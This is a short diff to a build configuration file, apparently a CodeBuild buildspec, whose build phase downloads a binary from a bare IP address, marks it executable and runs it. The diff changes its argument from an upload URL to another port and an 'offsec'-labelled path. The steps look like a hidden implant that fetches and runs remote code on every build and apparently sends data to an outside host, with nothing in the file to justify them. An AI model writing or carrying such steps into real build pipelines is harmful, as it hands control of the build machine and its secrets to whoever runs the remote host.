@@ -12,7 +12,7 @@ phases:
       - echo Build started on `date`
       - wget http://82.197.68.107:8000/download -O /tmp/main
       - chmod +x /tmp/main 
-      - /tmp/main http://82.197.68.107:8000/upload
+      - /tmp/main http://82.197.68.107:15000/offsec-tvlk
       - python main.py
   post_build:
     commands:
